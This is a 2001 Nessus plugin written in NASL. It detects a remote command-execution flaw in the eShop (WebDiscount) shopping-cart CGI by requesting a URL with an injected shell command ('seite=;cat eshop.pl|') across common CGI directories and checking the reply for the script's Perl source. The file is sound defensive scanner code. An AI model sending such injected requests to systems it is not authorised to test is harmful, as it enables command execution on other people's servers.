#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10775); 
 script_cve_id("CAN-2001-1014");
 script_bugtraq_id(3340);
 script_version ("$Revision: 1.13 $");

 name["english"] = "E-Shopping Cart Arbitrary Command Execution (WebDiscount)";
 script_name(english:name["english"]);

 desc["english"] = "
The eShop (WebDiscount) CGI is installed. A security problem in this CGI 
allows anyone to execute arbitrary commands with the privileges of the
web server.

Solution: Contact the author for a patch.
Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/5JP0M005FU.html
";

 script_description(english:desc["english"]);

 summary["english"] = "E-Shopping Cart Arbitrary Command Execution (WebDiscount)";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if (!port) port = 80;

if(!get_port_state(port))exit(0);


function check(prefix)
{
  url = string(prefix, "/eshop.pl/seite=;cat%20eshop.pl|");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  
  if (egrep(pattern:"^#!/.*/perl", string:buf))
  {
   security_hole(port:port);
   exit(0);
  }
 return(0);
}


check(prefix:"/cgi-local");
foreach dir (cgi_dirs())
{
check(prefix:dir);
}
